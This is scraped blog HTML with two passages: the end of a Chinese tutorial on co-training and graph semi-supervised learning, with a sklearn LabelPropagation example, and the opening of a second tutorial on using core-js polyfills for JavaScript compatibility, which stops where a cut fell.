<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/87375c9b56604fce8becc58bb5adc4cd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYWljb3Rpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769529196&amp;x-signature=hzxee7I3tYlw9HayZzUG3kDss9Q%3D" alt="" loading="lazy"/></p>
<p>协同训练的优点在于能够充分利用未标注数据，特别适合 多视图信息丰富 的任务，如网页分类（标题与正文）、多模态数据（图像与文本特征）、音视频分析等。相比自训练，协同训练更稳健，因为两个分类器互相监督，单一模型的错误不容易传播。</p>
<p>然而，协同训练也存在局限性。首先，它依赖于特征视图的充分互补性，如果两个视图高度相关或某个视图信息不足，效果可能不佳。其次，伪标签的质量仍然会影响迭代过程，如果两个分类器都产生大量错误伪标签，模型性能可能下降。为了改进，研究者提出了方法，例如动态选择最可靠的伪标签、引入一致性约束或结合深度特征学习，以增强在复杂任务中的适应性。</p>
<p>协同训练在实际应用中已经被广泛使用。在文本分类中，可以利用标题与正文两个视图互相提供信息，减少人工标注成本；在图像识别和多模态任务中，不同特征提取方式可以形成互补视图，提升分类准确率；在网页推荐或社交网络分析中，用户行为和内容特征也可作为两种视图进行协同训练。</p>
<h2 data-id="heading-2">图半监督学习</h2>
<p>图半监督学习是一类利用图结构表示数据关系，并在少量标注样本指导下进行预测的机器学习方法。与传统半监督学习不同，图半监督学习不仅考虑单个样本特征，还将样本之间的相似性或邻接关系编码为图结构，通过图的传播机制将标注信息扩散到未标注节点上，从而实现全局一致性的学习。该方法特别适用于数据天然具有网络结构的场景，如社交网络、知识图谱、分子结构和推荐系统等。</p>
<p>在图半监督学习中，首先将数据构建为图 ，其中节点 表示样本，边 表示样本之间的相似性或关联。通常，边的权重 通过样本间特征距离或相似性度 量（如高斯核）计算得到。</p>
<p>图半监督学习的核心思想是“标签平滑假设（label smoothness assumption）”，即相连的节点倾向于具有相同标签。基于这一假设，可以通过优化目标或传播算法，将少量标注信息传播到整个图中，从而对未标注节点进行预测。</p>
<h3 data-id="heading-3">典型方法</h3>
<ol>
<li>标签传播（Label Propagation, LP）</li>
</ol>
<p>标签传播方法利用图的邻接矩阵和归一化权重，通过迭代更新未标注节点的标签分布，直到收敛。每轮迭代中，节点的标签信息根据邻居节点的标签加权平均更新，从而实现标签的平滑扩散。</p>
<ol start="2">
<li>图正则化方法（Graph Regularization）</li>
</ol>
<p>图正则化方法将图结构引入损失函数，通过增加正则化项鼓励相连节点的预测结果相似。典型形式是最小化以下目标函数：</p>
<p>其中第一项是标注节点的监督损失，第二项是图平滑正则化项，λ 控制平滑程度。</p>
<p>3.图神经网络（Graph Neural Networks, GNNs）</p>
<p>随着深度学习的发展，图神经网络成为图半监督学习的主流方法。GNN通过节点特征的消息传递机制，将邻居节点信息整合到目标节点表示中，既能捕捉局部结构，又能利用标注信息进行端到端训练。常见模型包括 GCN（Graph Convolutional Network）、GraphSAGE、GAT（Graph Attention Network）等。</p>
<p>下面我们使用 sklearn 的 LabelPropagation 来演示图半监督学习：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
<span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt
<span class="hljs-keyword">from</span> sklearn.datasets <span class="hljs-keyword">import</span> load_iris
<span class="hljs-keyword">from</span> sklearn.semi_supervised <span class="hljs-keyword">import</span> LabelPropagation
<span class="hljs-keyword">from</span> sklearn.decomposition <span class="hljs-keyword">import</span> PCA
<span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> train_test_split

<span class="hljs-comment"># 1. 加载数据</span>
X, y = load_iris(return_X_y=<span class="hljs-literal">True</span>)

<span class="hljs-comment"># 2. 随机挑选带标签样本</span>
rng = np.random.RandomState(<span class="hljs-number">42</span>)
n_total = X.shape[<span class="hljs-number">0</span>]
n_labeled = <span class="hljs-number">15</span>  <span class="hljs-comment"># 只标注部分样本</span>
indices = np.arange(n_total)
rng.shuffle(indices)

y_semi = -np.ones(n_total)  <span class="hljs-comment"># 未标注样本用 -1 表示</span>
y_semi[indices[:n_labeled]] = y[indices[:n_labeled]]

<span class="hljs-comment"># 3. PCA 降维便于可视化</span>
pca = PCA(n_components=<span class="hljs-number">2</span>)
X_2d = pca.fit_transform(X)

<span class="hljs-comment"># 4. 构建 LabelPropagation 模型</span>
label_prop_model = LabelPropagation(kernel=<span class="hljs-string">'rbf'</span>, gamma=<span class="hljs-number">20</span>)
label_prop_model.fit(X, y_semi)

<span class="hljs-comment"># 5. 预测所有样本</span>
y_pred = label_prop_model.transduction_

<span class="hljs-comment"># 6. 可视化结果</span>
plt.figure(figsize=(<span class="hljs-number">12</span>, <span class="hljs-number">5</span>))

<span class="hljs-comment"># 原始带标签样本</span>
plt.subplot(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>)
plt.scatter(X_2d[:, <span class="hljs-number">0</span>], X_2d[:, <span class="hljs-number">1</span>], c=<span class="hljs-string">'gray'</span>, alpha=<span class="hljs-number">0.5</span>, label=<span class="hljs-string">'Unlabeled'</span>)
plt.scatter(X_2d[indices[:n_labeled], <span class="hljs-number">0</span>], X_2d[indices[:n_labeled], <span class="hljs-number">1</span>], c=y[indices[:n_labeled]], cmap=<span class="hljs-string">'Set1'</span>, edgecolor=<span class="hljs-string">'k'</span>, s=<span class="hljs-number">80</span>)
plt.title(<span class="hljs-string">"Initial Labeled Samples"</span>)
plt.legend()

<span class="hljs-comment"># Label Propagation 预测结果</span>
plt.subplot(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">2</span>)
plt.scatter(X_2d[:, <span class="hljs-number">0</span>], X_2d[:, <span class="hljs-number">1</span>], c=y_pred, cmap=<span class="hljs-string">'Set1'</span>, edgecolor=<span class="hljs-string">'k'</span>, s=<span class="hljs-number">80</span>)
plt.title(<span class="hljs-string">"Label Propagation Prediction"</span>)
plt.show()
</code></pre>
<p>运行结果下图所示，</p>
<ol>
<li>左图：初始带标签样本很少（15 个），大部分样本为灰色未标注。</li>
<li>右图：Label Propagation 利用图结构（RBF 核构建相似性）将标签从少量标注样本传播到整个数据集，几乎所有未标注样本都被正确分类。</li>
</ol>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6f950d992edf469bb861fe296817e5db~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYWljb3Rpbmc=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769529196&amp;x-signature=a%2F5ArtAPcgHSGXZO50aiYy0Xn4M%3D" alt="" loading="lazy"/></p>
<p>图半监督正是学习如何利用样本间相似性，将标注信息扩散到未标注样本，从而实现高效预测。</p>
<p>图半监督学习在社交网络中，可以利用部分用户的兴趣标签预测其他用户的兴趣偏好；在知识图谱中，可以推断未标注实体的类别或关系；在化学分子数据中，可以根据少量标注分子性质预测其他分子的性质；在推荐系统中，通过用户或物品之间的关联图，实现对冷启动用户或物品的预测。</p>
<p>总结一下，图半监督学习充分利用数据间的关系结构，在标注样本有限的情况下，通过标签传播、图正则化或图神经网络等方法，实现对未标注数据的高效预测。</p>
<p>📚 推荐阅读</p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwMTcyOTcyOQ%3D%3D%26mid%3D2247485782%26idx%3D1%26sn%3D060c8222b47cbf903fbfded1f0421bcf%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwMTcyOTcyOQ==&amp;mid=2247485782&amp;idx=1&amp;sn=060c8222b47cbf903fbfded1f0421bcf&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">机器学习之数据预处理篇！</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwMTcyOTcyOQ%3D%3D%26mid%3D2247485800%26idx%3D1%26sn%3Da52107c9dc7071d8530a24563861fa46%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwMTcyOTcyOQ==&amp;mid=2247485800&amp;idx=1&amp;sn=a52107c9dc7071d8530a24563861fa46&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">机器学习特征工程中的特征选择</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwMTcyOTcyOQ%3D%3D%26mid%3D2247485808%26idx%3D1%26sn%3D2c57081d4b12433f6b8919209e2e52ed%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwMTcyOTcyOQ==&amp;mid=2247485808&amp;idx=1&amp;sn=2c57081d4b12433f6b8919209e2e52ed&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">机器学习中的特征构造</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwMTcyOTcyOQ%3D%3D%26mid%3D2247485820%26idx%3D1%26sn%3Dadcb41fd14347f2f1431709323fa253f%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwMTcyOTcyOQ==&amp;mid=2247485820&amp;idx=1&amp;sn=adcb41fd14347f2f1431709323fa253f&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">机器学习之特征降维</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwMTcyOTcyOQ%3D%3D%26mid%3D2247485941%26idx%3D1%26sn%3Dcb53a98bacd1cfbd3255bbeeab6a24ec%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwMTcyOTcyOQ==&amp;mid=2247485941&amp;idx=1&amp;sn=cb53a98bacd1cfbd3255bbeeab6a24ec&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">一文搞懂层次聚类和密度聚类方法！</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwMTcyOTcyOQ%3D%3D%26mid%3D2247485946%26idx%3D1%26sn%3Da5cf50a4a3bda9785fb0c7baae3a6bb2%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwMTcyOTcyOQ==&amp;mid=2247485946&amp;idx=1&amp;sn=a5cf50a4a3bda9785fb0c7baae3a6bb2&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">一文搞懂机器学习中的PCA主成分分析！</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwMTcyOTcyOQ%3D%3D%26mid%3D2247485952%26idx%3D1%26sn%3Dffe1fca4cb75b2f99ace92593554837c%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwMTcyOTcyOQ==&amp;mid=2247485952&amp;idx=1&amp;sn=ffe1fca4cb75b2f99ace92593554837c&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">机器学习中独立成分分析ICA和主成分分析PCA有什么区别？</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwMTcyOTcyOQ%3D%3D%26mid%3D2247485960%26idx%3D1%26sn%3D05cf98957ea11dcd6ae165588b4c91c7%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwMTcyOTcyOQ==&amp;mid=2247485960&amp;idx=1&amp;sn=05cf98957ea11dcd6ae165588b4c91c7&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">一文搞懂t-SNE和UMAP降维方法！</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzkwMTcyOTcyOQ%3D%3D%26mid%3D2247485972%26idx%3D1%26sn%3De106fcda9b02b7e8a6fb31495bb28dae%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzkwMTcyOTcyOQ==&amp;mid=2247485972&amp;idx=1&amp;sn=e106fcda9b02b7e8a6fb31495bb28dae&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer">万字长文！搞懂机器学习中的概率图模型</a></p>
<p>最新的文章都在公众号aicoting更新，别忘记关注哦！！！</p>
<p>作者：aicoting</p>
<p>分享是一种信仰，连接让成长更有温度。</p>
<p>我们下次不见不散！</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Polyfill方式解决前端兼容性问题：core-js包结构与各种配置策略]]></title>    <link>https://juejin.cn/post/7597258378590846986</link>    <guid>https://juejin.cn/post/7597258378590846986</guid>    <pubDate>2026-01-20T15:57:09.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597258378590846986" data-draft-id="7597317683051429897" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Polyfill方式解决前端兼容性问题：core-js包结构与各种配置策略"/> <meta itemprop="keywords" content="前端,JavaScript,Node.js"/> <meta itemprop="datePublished" content="2026-01-20T15:57:09.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="漂流瓶jz"/> <meta itemprop="url" content="https://juejin.cn/user/3694779980078877"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Polyfill方式解决前端兼容性问题：core-js包结构与各种配置策略
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3694779980078877/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    漂流瓶jz
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T15:57:09.000Z" title="Tue Jan 20 2026 15:57:09 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读20分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">简介</h2>
<p>在之前我介绍过Babel：<a href="https://link.juejin.cn?target=https%3A%2F%2Fjzplp.github.io%2F2025%2Fbabel-intro.html" target="_blank" title="https://jzplp.github.io/2025/babel-intro.html" ref="nofollow noopener noreferrer">解锁Babel核心功能：从转义语法到插件开发</a>，Babel是一个使用AST转义JavaScript语法，提高代码在浏览器兼容性的工具。但有些ECMAScript并不是新的语法，而是一些新对象，新方法等等，这些并不能使用AST抽象语法树来转义。因此Babel利用core-js实现这些代码的兼容性。</p>
<p>core-js是一个知名的前端工具库，里面包含了ECMAScript标准中提供的新对象/新方法等，而且是使用旧版本支持的语法来实现这些新的API。这样即使浏览器没有实现标准中的新API，也能通过注入core-js代码来提供对应的功能。</p>
<p>像这种通过注入代码实现浏览器没有提供的API特性，叫做Polyfill。这个单词的本意是填充材料，在JavaScript领域中，这些注入的代码就类似“填充材料”一样，帮助我们提高代码的兼容性。另外core-js还提供了一些还在提议中的API的实现。</p>
<h2 data-id="heading-1">core-js使用方式</h2>
<h3 data-id="heading-2">使用前后对比</h3>
<p>要想看到core-js使用前后的效果对比，首先需要确定某个特性和对应的执行环境，在这个环境中对应的特性不存在。我本地是Node.js v18.19.1版本，这个版本并没有实现Promise.try这个方法，因此我们就用这个方法进行实验。首先是没有引入core-js的场景：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'jzplp!'</span>)
})

<span class="hljs-comment">/* 执行结果
Promise.try(() =&gt; {
           ^
TypeError: Promise.try is not a function
*/</span>
</code></pre>
<p>可以看到没有引入core-js，直接使用Promise.try时，会因为没有该方法而报错。然后再试试引入core-js的效果：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js'</span>)
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'jzplp!'</span>)
})

<span class="hljs-comment">/* 输出结果
jzplp!
*/</span>
</code></pre>
<p>可以看到引入core-js后，原本不存在的API被填充了，我们的代码可以正常执行并拿到结果了。这就是core-js提高兼容性的效果。</p>
<h3 data-id="heading-3">单个API引入</h3>
<p>core-js不仅可以直接引入全部语法，还可以仅引入单个API，比如某个对象或某个方法。首先看下只引入Promise对象：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// require('core-js/full') 等于 require('core-js')</span>
<span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js/full/promise'</span>)
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'jzplp!'</span>)
})

<span class="hljs-comment">/* 输出结果
jzplp!
*/</span>
</code></pre>
<p>然后再看下直接引入对象中的某个方法：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js/full/promise/try'</span>)
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'jzplp!'</span>)
})

<span class="hljs-comment">/* 输出结果
jzplp!
*/</span>
</code></pre>
<h3 data-id="heading-4">不注入全局对象</h3>
<p>前面展示的场景，core-js都是将API直接注入到全局，这样使用这些API就如环境本身支持一样，基本感受不到区别。但如果我们不希望直接注入到全局时，core-js也提供了使用方式：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> promise = <span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js-pure/full/promise'</span>);
promise.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'jzplp!'</span>)
})
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'jzplp!2'</span>)
})
<span class="hljs-comment">/* 输出结果
jzplp!
Promise.try(() =&gt; {
           ^
TypeError: Promise.try is not a function
*/</span>
</code></pre>
<p>可以看到，使用core-js-pure这个包之后，可以直接导出我们希望要的API，而不直接注入到全局。此时直接使用全局对象方法依然报错。而core-js这个包虽然也能导出，但它还是会直接注入全局，我们看下例子：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> promise = <span class="hljs-built_in">require</span>(<span class="hljs-string">'core-js/full/promise'</span>);
promise.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'jzplp!'</span>)
})
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'jzplp!2'</span>)
})

<span class="hljs-comment">/* 输出结果
jzplp!
jzplp!2
*/</span>
</code></pre>
<p>因此，如果希望仅使用导出对象，还是需要使用core-js-pure这个包。core-js-pure也可以仅导出对象方法：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> try2 = <span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js-pure/full/promise/try"</span>);
<span class="hljs-title class_">Promise</span>.<span class="hljs-property">try</span> = try2;
<span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">try</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"jzplp!"</span>);
});

<span class="hljs-comment">/* 输出结果
jzplp!
*/</span>
</code></pre>
<p>因为导出的对象方法不能独立使用，因此在例子中我们还是将其注入到Promise对象后使用。</p>
<h3 data-id="heading-5">特性分类引入</h3>
<p>core-js中包含非常多API特性的兼容代码，有些是已经稳定的特性，有些是还处在提议阶段的，不稳定的特性。我们直接引入core-js会把这些特性全部引入，但如果不需要那些不稳定特性，core-js也提供了多种引入方式：</p>
<ul>
<li>core-js 引入所有特性，包括早期的提议</li>
<li>core-js/full 等于引入core-js</li>
<li>core-js/actual 包含稳定的ES和Web标准特性，以及stage3的特性</li>
<li>core-js/stable 包含稳定的ES和Web标准特性</li>
<li>core-js/es 包含稳定的ES特性</li>
</ul>
<p>这里我们举两个例子尝试下。首先由于ECMAScript标准一直在更新中，有些特性现在是提议，未来可能就已经被列入正式特性了。因此这里的例子需要明确环境和core-js版本。这里我们使用Node.js v18.19.1和core-js@3.47.0版本，以写这篇文章的时间为准。</p>
<p>首先第一个特性是：数组的lastIndex属性，这是一个stage1阶段的API，这里针对不同的引入方式进行尝试：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 不引入core-js尝试</span>
<span class="hljs-keyword">const</span> arr = [<span class="hljs-string">"jz"</span>, <span class="hljs-string">"plp"</span>];
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-property">lastIndex</span>);
<span class="hljs-comment">/* 输出结果
undefined
*/</span>

<span class="hljs-comment">// 引入core-js/full</span>
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/full"</span>);
<span class="hljs-keyword">const</span> arr = [<span class="hljs-string">"jz"</span>, <span class="hljs-string">"plp"</span>];
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-property">lastIndex</span>);
<span class="hljs-comment">/* 输出结果
1
*/</span>

<span class="hljs-comment">// 引入core-js/actual</span>
<span class="hljs-built_in">require</span>(<span class="hljs-string">"core-js/actual"</span>);
<span class="hljs-keyword">const</span> arr = [<span class="hljs-string">"jz"</span>, <span class="hljs-string">"plp"</span>];
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-property">lastIndex</span>);

<span class="hljs-comment">/* 输出结果
undefined
*/</span>
</code></pre>
<p>首先当不引入core-js时，因为不支持这个API，所以输出undefined。core-js/full支持stage1阶段的API，可以正确输出结果。但core-js/actual仅支持stage3阶段的API，因此还是不支持这个API。</p>
<p>然后我们再看下另外一个API，数组的groupBy方法。这是一个stage3阶段的API：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// 不引入core-js尝试</span>
<span class="hljs-keyword">const</span> arr = [
  { <span class="hljs-attr">group</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">"jz"</span> },
  { <span class="hljs-attr">group</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">"jz2"</span> },
  { <span class="hljs-attr">group</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">value</span>: <span class="hljs-string">"plp"</span> },
];
<span class="hljs-keyword">const</span> arrNew = arr.<span class="hljs-title function_">groupBy</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">group</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arrNew)
<span class="hljs-comment">/* 输出结果
const arrNew = arr.groupBy(item =&gt; item.group);
                   ^
TypeError: arr.groupBy is not a function
*/</span>

<span class="hljs-comment">// 引入core-js/actual</span>
